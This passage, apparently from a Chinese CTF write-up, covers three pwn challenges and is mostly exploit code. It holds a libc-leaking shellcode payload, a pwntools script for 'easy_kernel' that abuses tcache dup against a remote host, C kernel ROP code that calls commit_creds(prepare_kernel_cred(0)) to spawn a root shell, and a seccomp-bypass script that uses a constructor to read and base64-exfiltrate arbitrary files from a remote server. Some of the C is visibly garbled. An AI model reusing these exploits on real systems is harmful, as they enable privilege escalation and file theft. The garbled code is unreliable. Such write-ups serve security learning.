    # leak libc
    shellcode = ''
    shellcode += mov_reg0(cbase + ctx.binary.got['puts'])
    shellcode += syscall(2) # puts
    # 得到open
    shellcode += mov_reg0(0) # fd
    shellcode += mov_reg1(cbase + 0x2038f8) # buf syscall(3)的位置为free项，改成open
    shellcode += mov_reg2(8) # nbytes
    shellcode += syscall(0) # read
    # open
    shellcode += mov_reg0(filename_addr) 
    shellcode += mov_reg1(0)
    shellcode += mov_reg2(0)
    shellcode += syscall(3) # open
    # read
    shellcode += mov_reg0(3) # fd
    shellcode += mov_reg1(next_read_addr + 0x500) # buf
    shellcode += mov_reg2(0x100) # nbytes
    shellcode += syscall(0)
    # puts
    shellcode += mov_reg0(next_read_addr + 0x500)
    shellcode += syscall(2)
    shellcode += halt()
    shellcode = shellcode.format(_addr_=p64(len(shellcode)+shellcode_addr))
    shellcode += './flag\x00'
    #dbg()
    pay = 'a' * 0x100 + p64(shellcode_addr) + shellcode 
    sa('say:', pay)
    ru('bye~\n')
    puts = uu64(r(6))
    leak('puts', puts)
    lbase = puts - ctx.libc.sym['puts']
    leak('lbase', lbase)
    open_addr = lbase + ctx.libc.sym['open']
    s(p64(open_addr))
    irt()
###  easy_kernel
解包root.img得到easy_kernel程序，upx脱壳  
本质就是个用户态堆题+内核态的栈溢出  
内核栈溢出没啥可说的，虽然保护全开但是有leak  
堆这边虽然把堆canary藏到了内核里，但edit功能条件写成了或，等于没check，堆是有tcache double free
check的所以构造的时候要小心不能溢出，然后就是简单的tcache
dup，打ptr就有任意写了，一开始想改返回地址，发现居然发不了0x7f(会变成删除键好像。。。)想了半天发现居然有one_gadget可用我傻了，exp如下：
    #coding=utf8
    from pwn import *
    # context.log_level = 'debug'
    context.terminal = ['gnome-terminal','-x','bash','-c']
    local = 0
    binary_name = 'easy_kernel'
    if local:
        # cn = process('./'+binary_name)
        cn = process('./start_vm.sh',stdin=PTY)
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)
        #libc = ELF('/lib/i386-linux-gnu/libc-2.23.so',checksec=False)
    else:
        cn = remote('124.70.135.106',12574)
        #libc = ELF('')
    ru = lambda x : cn.recvuntil(x)
    sn = lambda x : cn.send(x)
    rl = lambda   : cn.recvline()
    sl = lambda x : cn.sendline(x)
    rv = lambda x : cn.recv(x)
    sa = lambda a,b : cn.sendafter(a,b)
    sla = lambda a,b : cn.sendlineafter(a,b)
    if binary_name != '':
        bin = ELF('./'+binary_name,checksec=False)
    def z(a=''):
        if local:
            gdb.attach(cn,a)
            if a == '':
                raw_input()
        else:
            pass
    def add(idx,sz,con):
        sla('Your choice:','1')
        sla('Index:',str(idx))
        sla('Size:',str(sz))
        sla('Content:',con)
    def dele(idx):
        sla('Your choice:','2')
        sla('Index:',str(idx))
    def show(idx):
        sla('Your choice:','3')
        sla('Index:',str(idx))
    def edit(idx,con):
        sla('Your choice:','4')
        sla('Index:',str(idx))
        sla('Content:',con)
    add(0,8,'a'*8)
    # show(0)
    # ru('Content: '+'a'*0x8)
    # canary = u64(rv(8))
    add(1,8,'a')
    add(2,8,'a')
    add(3,8,'a')
    dele(0)
    dele(1)
    edit(1,p64(0x00000000004C3CE8-1))
    add(4,8,'a')
    add(5,8,'')
    show(5)
    ru('Content: \x0d')
    stack = u64(rv(7)[1:]+'\x00\x00')# - 0x0a
    dele(2)
    dele(3)
    edit(3,p64(0x00000000004C4300))
    add(0,0x100,'a')
    add(1,8,'a')
    add(2,8,p64(0x00000000004C4300+8))
    stack -= 0x160#ret address
    # raw_input()
    edit(0,p64(0x4C3228)+'a'*0x70 + p32(0x100)*2)
    prdi = 0x00000000004019fa
    prsi = 0x000000000040fb2e
    prdx = 0x00000000004017cf
    buf = p64(0x0000000000453270)
    edit(1,buf)
    sla('Your choice:','5')
    data = open('exp.base64','rb').read()
    # cn.interactive()
    cmd = '''cat > /tmp/exp.base  /tmp/exp
    chmod +x /tmp/exp
    /tmp/exp
    '''.format(data)
    sla('/ $',cmd)
    cn.interactive()
    #include 
    #include 
    #include 
    #include 
    #include 
    void my_read(char *addr,size_t len)
    {
        syscall(678,0,addr,len);
    }
    void my_write(char *addr,size_t len)
    {
        syscall(678,1,addr,len);
    }
    void get_shell()
    {
        system("/bin/sh");
    }
    size_t user_cs, user_ss, user_rflags, user_sp;
    void save_status()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;");
        printf("ip is 0x%lx\n", (size_t)get_shell);
        printf("cs is 0x%lx\n", user_cs);
        printf("ss is 0x%lx\n", user_ss);
        user_sp -= 0x100;
        printf("sp is 0x%lx\n", user_sp);
        printf("flag is 0x%lx\n", user_rflags);
        puts("status has been saved.");
    }
    //0xFFFFFFFF82663660 modprobe_path
    int main()
    {
        signal(SIGSEGV, get_shell);
        char buf[0x1000];
        my_read(buf,0x200);
        uint64_t base = *(uint64_t *)&buf[0x128] - 0x10b8b2a;
        printf("vmlinux:%p\n",base);
        printf("%p\n",my_write);
        save_status();
        uint64_t rops[] = {
            base+0x108df00,//pop rdi;ret
            0,
            base+0x10cf3d0,//prepare_kernel_cred
            base+0x1137c0d,//cmp cl,cl ; ret
            base+0x1565734,//mov rdi, rax ; jne 0xffffffff81565728 ; xor eax, eax ; ret
            base+0x10cef40,//commit_creds
            base+0x107a3a0,//swapgs ; ret
            base+0x103BAEB,//iret
            get_shell,
            user_cs,
            user_rflags,
            user_sp,
            user_ss
        };
        memcpy(&buf[0x128],rops,sizeof(rops));
        my_write(buf,0x200);
        return 0;
    }
###  sandbox
查看源码，提示有黑名单+白名单
open不能用，想到可能是seccomp的沙箱规则，又想到init函数在main函数之前运行，就尝试一下在init函数里使用open：
    #include 
    #include 
    void __attribute__((constructor)) test_init(void) {
        int fd = open("/proc/self/cmdline", 0);
        printf("fd=%d\n", fd);
    }
    int main()
    {
        int fd = open("/proc/self/cmdline", 0);
        printf("fd=%d\n", fd);
        return 0;
    }
发现结果不一样，看来init函数执行的时候，沙箱规则还没配置
    fd=3
    fd=-1
读取目录下的文件名
    #include 
    #include 
    #include 
    #include 
    void __attribute__((constructor)) test_init(void) {
        DIR *dir = opendir(".");
        if (dir != NULL) {
            printf("dir != NULL\n");
            struct dirent *d;
            while ((d = readdir(dir))!= NULL) {
                printf("%s\n", d->d_name);
            }
        }
    }
    int main()
    {
        return 0;
    }
    dir != NULL
    ..
    .
    init.c
    index.html
    web_server.py
    libhook.so
    flag
    daemon
flag打不开，libhook.so因为不可见字符没法显示（服务器直接500了），base64转一下
base64编码c语言实现直接网上查就有，改一下就行
获取任意文件的脚本(python3):
    #coding=utf8
    import requests
    from base64 import b64decode
    url = 'http://149.28.31.156:12564/submit'
    def getfile(filename, dst):
        code = r'''
    #include 
    #include 
    const char * base64char = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    const char padding_char = '=';
    int base64_encode(const unsigned char * sourcedata, char * base64, int len)
    {
        int i=0, j=0;
        unsigned char trans_index=0;    // 索引是8位，但是高两位都为0
        const int datalength = len;
        for (; i > 2) & 0x3f);
            base64[j++] = base64char[(int)trans_index];
            // 第二个
            trans_index = ((sourcedata[i] > 4) & 0x0f);
                base64[j++] = base64char[(int)trans_index];
            }else{
                base64[j++] = base64char[(int)trans_index];
                base64[j++] = padding_char;
                base64[j++] = padding_char;
                break;   // 超出总长度，可以直接break
            }
            // 第三个
            trans_index = ((sourcedata[i + 1] > 6) & 0x03);
                base64[j++] = base64char[(int)trans_index];
                trans_index = sourcedata[i + 2] & 0x3f;
                base64[j++] = base64char[(int)trans_index];
            }
            else{
                base64[j++] = base64char[(int)trans_index];
                base64[j++] = padding_char;
            }
        }
        base64[j] = '\0'; 
        return 0;
    }
    void __attribute__((constructor)) test_init(void) {
        char buf[0x100];
        char b64[0x200];
        int n;
        int fd = open("''' + filename + r'''", 0);
        if (fd >= 0) {
            while((n = read(fd, buf, 0x100)) > 0) {
                base64_encode(buf, b64, n);
                puts(b64);